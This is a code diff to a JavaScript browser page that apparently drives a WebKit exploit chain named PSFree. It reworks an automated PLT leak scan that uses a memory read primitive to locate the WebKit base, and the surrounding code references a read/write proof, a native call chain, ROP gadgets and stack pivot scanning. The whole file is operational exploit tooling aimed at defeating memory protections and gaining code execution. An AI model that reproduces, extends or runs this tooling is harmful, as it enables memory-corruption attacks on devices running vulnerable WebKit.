@@ -46,7 +46,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830l";
+const BUILD_ID = "rw-20250830m";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -110,7 +110,8 @@ let raceMode = false;
 const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
-let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk, btnPsfreeLk, btnPeek, btnClear;
+let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk;
+let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot;
 let gadgetBtns = [];
 let g5BarBtns = [];
@@ -219,10 +220,9 @@ function setUi() {
     if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
     if (btnForceLk) btnForceLk.disabled = busy || !ready;
     if (btnGuessLk) btnGuessLk.disabled = busy || !ready;
-    if (btnPsfreeLk) {
-        btnPsfreeLk.disabled = !ready || (busy && !psfreeAutoScan);
-        btnPsfreeLk.textContent = psfreeAutoScan ? "Stop PSFree" : "PSFree lk";
-    }
+    if (btnPsfreeLite) btnPsfreeLite.disabled = !ready || (busy && !psfreeAutoScan);
+    if (btnPsfreeLk) btnPsfreeLk.disabled = !ready || (busy && !psfreeAutoScan);
+    if (btnPsfreeStop) btnPsfreeStop.disabled = !psfreeAutoScan;
     if (btnPeek) btnPeek.disabled = busy || !ready;
     if (pickPtr) pickPtr.disabled = busy || !ready;
     if (addrIn) addrIn.disabled = busy || !ready;
@@ -368,8 +368,10 @@ let calLkCands = null;
 let psfreePltState = null;
 let psfreeAutoScan = false;
 let psfreeAutoStop = false;
-const PSFREE_READS_BATCH = parseInt(params.get("psfreereads") || "768", 10);
-const PSFREE_YIELD_BATCHES = parseInt(params.get("psfreeyield") || "4", 10);
+let psfreePreset = null;
+
+const PSFREE_LITE = { maxReads: 24, yieldBatches: 1, scanEnd: 0x20000, label: "lite" };
+const PSFREE_NORM = { maxReads: 48, yieldBatches: 1, scanEnd: 0x28000, label: "norm" };
 
 function parseCalPtr(raw) {
     const s = String(raw).replace(/^0x/i, "").trim();
@@ -1893,14 +1895,15 @@ function finishPsfreeChunk(chunk) {
     return false;
 }
 
-/** Auto PSFree PLT scan — runs until hit/miss/stop. */
-async function runPsfreeLkAuto() {
+function stopPsfreeScan() {
+    psfreeAutoStop = true;
+    state("PSFree stopping…", "warn");
+}
+
+/** Auto PSFree PLT scan — preset controls batch size and scan cap (no URL params). */
+async function runPsfreeLkAuto(preset) {
     if (!ready || !window.p) return;
-    if (psfreeAutoScan) {
-        psfreeAutoStop = true;
-        state("PSFree stopping…", "warn");
-        return;
-    }
+    if (psfreeAutoScan) return;
     const p = window.p;
     const off = loadEffectiveOff();
     const { webkitBase } = basesFromSession(off);
@@ -1909,22 +1912,28 @@ async function runPsfreeLkAuto() {
         return;
     }
 
+    psfreePreset = preset || PSFREE_LITE;
+    psfreePltState = null;
     psfreeAutoScan = true;
     psfreeAutoStop = false;
     busy = true;
     setUi();
-    mark("LK-PSFREE", "auto scan reads/batch=" + PSFREE_READS_BATCH
+    mark("LK-PSFREE", "auto " + psfreePreset.label
+        + " reads=" + psfreePreset.maxReads
+        + " cap=+0x" + psfreePreset.scanEnd.toString(16)
         + " build=" + BUILD_ID);
     renderOut();
 
-    const batchOpts = { maxReads: PSFREE_READS_BATCH };
+    const batchOpts = {
+        maxReads: psfreePreset.maxReads,
+        scanEnd: psfreePreset.scanEnd,
+    };
     let loops = 0;
-    let lastLog = 0;
 
     try {
         while (psfreeAutoScan && !psfreeAutoStop) {
             let inner = 0;
-            while (inner < PSFREE_YIELD_BATCHES && !psfreeAutoStop) {
+            while (inner < psfreePreset.yieldBatches && !psfreeAutoStop) {
                 const chunk = tryPsfreePltBatch(p, webkitBase, off, psfreePltState, batchOpts);
                 psfreePltState = chunk.state;
                 if (finishPsfreeChunk(chunk)) {
@@ -1938,20 +1947,20 @@ async function runPsfreeLkAuto() {
             const cursor = cur ? cur.cursor : 0;
             const tried = cur ? cur.tried : 0;
             const phase = cur ? cur.phase : "?";
-            if (loops - lastLog >= 1) {
-                lastLog = loops;
-                state("PSFree auto " + phase + " +0x" + cursor.toString(16)
+            if (loops % 4 === 0) {
+                state("PSFree " + psfreePreset.label + " +0x" + cursor.toString(16)
                     + " tried=" + tried, "warn");
-                if (lines.length > 12) lines.splice(0, lines.length - 12);
-                mark("LK-PSFREE", "auto +" + cursor.toString(16) + " tried=" + tried
-                    + " phase=" + phase);
+                mark("LK-PSFREE", psfreePreset.label + " +" + cursor.toString(16)
+                    + " tried=" + tried + " phase=" + phase);
+                if (lines.length > 16) lines.splice(0, lines.length - 16);
                 renderOut();
             }
-            await new Promise(function (r) { setTimeout(r, 0); });
+            await new Promise(function (r) { setTimeout(r, 1); });
         }
         if (psfreeAutoStop) {
-            mark("LK-PSFREE", "auto stopped tried="
-                + (psfreePltState ? psfreePltState.tried : 0));
+            mark("LK-PSFREE", "stopped @" + (psfreePltState
+                ? "+0x" + psfreePltState.cursor.toString(16) : "?")
+                + " tried=" + (psfreePltState ? psfreePltState.tried : 0));
             state("PSFree stopped", "warn");
         }
     } catch (err) {
@@ -1960,14 +1969,11 @@ async function runPsfreeLkAuto() {
     } finally {
         psfreeAutoScan = false;
         psfreeAutoStop = false;
+        psfreePreset = null;
         busy = false;
         setUi();
         renderOut();
     }
-}
-
-function runPsfreeLkStep() {
-    runPsfreeLkAuto();
 }
 
 async function runLeakLkScan() {
@@ -2670,7 +2676,9 @@ function init() {
     btnLoadCal = $("btn-load-cal");
     btnForceLk = $("btn-force-lk");
     btnGuessLk = $("btn-guess-lk");
+    btnPsfreeLite = $("btn-psfree-lite");
     btnPsfreeLk = $("btn-psfree-lk");
+    btnPsfreeStop = $("btn-psfree-stop");
     btnVerifyPivot = $("btn-verify-pivot");
     btnScanPivot = $("btn-scan-pivot");
     btnPeek = $("btn-peek");
@@ -2693,7 +2701,9 @@ function init() {
     wireClick(btnLoadCal, function () { runTryCalPtrs(); });
     wireClick(btnForceLk, function () { runManualTest("force-lk"); });
     wireClick(btnGuessLk, function () { runGuessLk(); });
-    wireClick(btnPsfreeLk, function () { return runPsfreeLkAuto(); });
+    wireClick(btnPsfreeLite, function () { return runPsfreeLkAuto(PSFREE_LITE); });
+    wireClick(btnPsfreeLk, function () { return runPsfreeLkAuto(PSFREE_NORM); });
+    wireClick(btnPsfreeStop, function () { stopPsfreeScan(); });
     wireClick(btnClear, function () {
         lines.length = 0;
         clearPersistedLog();
